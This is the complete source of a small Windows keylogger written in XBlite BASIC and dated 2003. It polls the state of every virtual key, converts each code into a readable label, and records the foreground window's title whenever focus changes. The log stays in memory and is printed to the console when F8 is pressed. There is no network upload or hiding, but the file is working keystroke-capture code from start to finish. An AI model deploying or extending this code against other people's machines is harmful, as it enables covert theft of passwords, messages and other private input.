'
'
'	Monitoring key strokes without the use of hooks.
'	by Michael McElligott
'
'	Mapei_@hotmail.com
'	10'th of July 2003
'	
'
'	F8 to print logged keys
'	F9 to exit
'
'
'	Written for[in] XBlite which can be found here: http://perso.wanadoo.fr/xblite/
'
PROGRAM "keylog"
CONSOLE

	IMPORT "gdi32.dec"
	IMPORT "user32"
	IMPORT "kernel32"
	IMPORT "msvcrt"


DECLARE FUNCTION Entry ()
DECLARE FUNCTION KeyCheck ()
DECLARE FUNCTION KeyPressed (vkey)


FUNCTION Entry ()
	SHARED STRING keylog
	SHARED XLONG lastkey
	XLONG tid

	thandle = _beginthreadex (NULL, 0, &KeyCheck(),0, 0, &tid)
	IFZ thandle THEN RETURN $$FALSE
	
	PRINT "F8 - Print current keylog"
	PRINT "F9 - Exit keylogging"
	
	DO
		IF lastkey = $$VK_F8 THEN PRINT keylog  ' print current keylog using F8
		IF lastkey = $$VK_F9 THEN								' exit keylogging using F9
			CloseHandle (thandle)
			thandle = 0
		END IF
		
		lastkey = NULL
		Sleep (10)
	LOOP WHILE thandle

	RETURN $$TRUE

END FUNCTION
	
FUNCTION KeyCheck ()

	DIM keys[255]
	DO 
		FOR k = 0 TO 255
			keys[k] = GetAsyncKeyState (k)
  		'NEXT k				' uncomment these two lines if you experience missed keys
   		'FOR k = 0 TO 255	' ^^^
			IF keys[k]{1,0} THEN KeyPressed (k)
   		NEXT k   		
		Sleep (10)
	LOOP
	
	RETURN $$TRUE
END FUNCTION

FUNCTION KeyPressed (vkey)
	SHARED STRING keylog
	SHARED XLONG lastkey
	STATIC STRING atitle
	STRING key,title

	lastkey = vkey
	SELECT CASE vkey
		CASE $$VK_LBUTTON		:key = "[LBUTTON]"
		CASE $$VK_RBUTTON		:key = "[RBUTTON]"
		CASE $$VK_CANCEL 		:key = "[CANCEL]"
		CASE $$VK_MBUTTON		:key = "[MBUTTON]"
		CASE $$VK_BACK			:key = "[BACK]"
		CASE $$VK_TAB			:key = "[TAB]"
		CASE $$VK_CLEAR			:key = "[CLEAR]"
		CASE $$VK_RETURN		:key = "[RETURN]\r\n"
		CASE $$VK_SHIFT			:key = ""			'"[SHIFT]"
		CASE $$VK_CONTROL		:key = ""			'"[CONTROL]"
		CASE $$VK_MENU			:key = ""			'"[MENU]"
		CASE $$VK_PAUSE			:key = "[PAUSE]"
		CASE $$VK_CAPITAL		:key = "CAPSLK"		'"[CAPITAL]"
		CASE $$VK_ESCAPE		:key = "[ESCAPE]"
		CASE $$VK_SPACE			:key = " "
		CASE $$VK_PRIOR			:key = "[PGUP]"		'"[PRIOR]"
		CASE $$VK_NEXT			:key = "[PGDN]"		'"[NEXT]"
		CASE $$VK_END			:key = "[END]"
		CASE $$VK_HOME			:key = "[HOME]"
		CASE $$VK_LEFT			:key = "[LEFT]"
		CASE $$VK_UP			:key = "[UP]"
		CASE $$VK_RIGHT			:key = "[RIGHT]"
		CASE $$VK_DOWN			:key = "[DOWN]"
		CASE $$VK_SELECT		:key = "[SELECT]"
		CASE $$VK_PRINT			:key = "[PRINT]"
		CASE $$VK_EXECUTE		:key = "[EXECUTE]"
		CASE $$VK_SNAPSHOT		:key = "[SNAPSHOT]"
		CASE $$VK_INSERT		:key = "[INSERT]"
		CASE $$VK_DELETE		:key = "[DELETE]"
		CASE $$VK_HELP			:key = "[HELP]"
		CASE $$VK_NUMPAD0		:key = "[NUMPAD0]"
		CASE $$VK_NUMPAD1		:key = "[NUMPAD1]"
		CASE $$VK_NUMPAD2		:key = "[NUMPAD2]"
		CASE $$VK_NUMPAD3		:key = "[NUMPAD3]"
		CASE $$VK_NUMPAD4		:key = "[NUMPAD4]"
		CASE $$VK_NUMPAD5		:key = "[NUMPAD5]"
		CASE $$VK_NUMPAD6		:key = "[NUMPAD6]"
		CASE $$VK_NUMPAD7		:key = "[NUMPAD7]"
		CASE $$VK_NUMPAD8		:key = "[NUMPAD8]"
		CASE $$VK_NUMPAD9		:key = "[NUMPAD9]"
		CASE $$VK_MULTIPLY		:key = "[MULTIPLY]"
		CASE $$VK_ADD			:key = "[ADD]"
		CASE $$VK_SEPARATOR		:key = "[SEPARATOR]"
		CASE $$VK_SUBTRACT		:key = "[SUBTRACT]"
		CASE $$VK_DECIMAL		:key = "[DECIMAL]"
		CASE $$VK_DIVIDE		:key = "[DIVIDE]"
		CASE $$VK_F1			:key = "[F1]"
		CASE $$VK_F2			:key = "[F2]"
		CASE $$VK_F3			:key = "[F3]"
		CASE $$VK_F4			:key = "[F4]"
		CASE $$VK_F5			:key = "[F5]"
		CASE $$VK_F6			:key = "[F6]"
		CASE $$VK_F7			:key = "[F7]"
		CASE $$VK_F8			:key = "[F8]"
		CASE $$VK_F9			:key = "[F9]"
		CASE $$VK_F10			:key = "[F10]"
		CASE $$VK_F11			:key = "[F11]"
		CASE $$VK_F12			:key = "[F12]"
		CASE $$VK_F13			:key = "[F13]"
		CASE $$VK_F14			:key = "[F14]"
		CASE $$VK_F15			:key = "[F15]"
		CASE $$VK_F16			:key = "[F16]"
		CASE $$VK_F17			:key = "[F17]"
		CASE $$VK_F18			:key = "[F18]"
		CASE $$VK_F19			:key = "[F19]"
		CASE $$VK_F20			:key = "[F20]"
		CASE $$VK_F21			:key = "[F21]"
		CASE $$VK_F22			:key = "[F22]"
		CASE $$VK_F23			:key = "[F23]"
		CASE $$VK_F24			:key = "[F24]"
		CASE $$VK_NUMLOCK		:key = "[NUMLOCK]"
		CASE $$VK_SCROLL		:key = "[SCROLL]"
		CASE $$VK_LSHIFT		:key = "[LSHIFT]"
		CASE $$VK_RSHIFT		:key = "[RSHIFT]"
		CASE $$VK_LCONTROL		:key = "[LCONTROL]"
		CASE $$VK_RCONTROL		:key = "[RCONTROL]"
		CASE $$VK_LMENU			:key = "[LALT]"		'"[LMENU]"
		CASE $$VK_RMENU			:key = "[RALT]"		'"[RMENU]"
		CASE $$VK_ATTN			:key = "[ATTN]"
		CASE $$VK_CRSEL			:key = "[CRSEL]"
		CASE $$VK_EXSEL			:key = "[EXSEL]"
		CASE $$VK_EREOF			:key = "[EREOF]"
		CASE $$VK_PLAY			:key = "[PLAY]"
		CASE $$VK_ZOOM			:key = "[ZOOM]"
		CASE $$VK_NONAME		:key = "[NONAME]"
		CASE $$VK_PA1			:key = "[PA1]"
		CASE $$VK_OEM_CLEAR		:key = "[OEM_CLEAR]"

		CASE 186				:key = ";"			' following keys are set up for my
		CASE 187				:key = "="			' "uk english" keyboard.
		CASE 188				:key = ","			' yours my differ.
		CASE 189				:key = "-"
		CASE 190				:key = "."
		CASE 191				:key = "/"
		CASE 192				:key = "'"
		CASE 219				:key = "["
		CASE 220				:key = "\\"
		CASE 221				:key = "]"
		CASE 222				:key = "#"
		CASE 223				:key = "`"

		CASE ELSE				:IF (vkey > 64) AND (vkey < 91) THEN vkey = vkey + 32	' set keys A-Z to lower case.
								 key = CHR$(vkey)
	END SELECT
	
	hwnd = GetForegroundWindow ()
	'GetParent (hwnd)
	len = GetWindowTextLengthA (hwnd)
	INC len
	title = SPACE$(len)
	GetWindowTextA (hwnd, &title,len)
 	title = CSTRING$(&title)
 	
 	IF title = "" THEN THEN title = "notitle"
 	IF title != atitle THEN		' log window with focus once per change/focus
 		atitle = title
 		keylog = keylog + "\r\n\r\n["+title+"]\r\n"
 	END IF

	keylog = keylog + key
	
	RETURN $$TRUE
END FUNCTION

END PROGRAM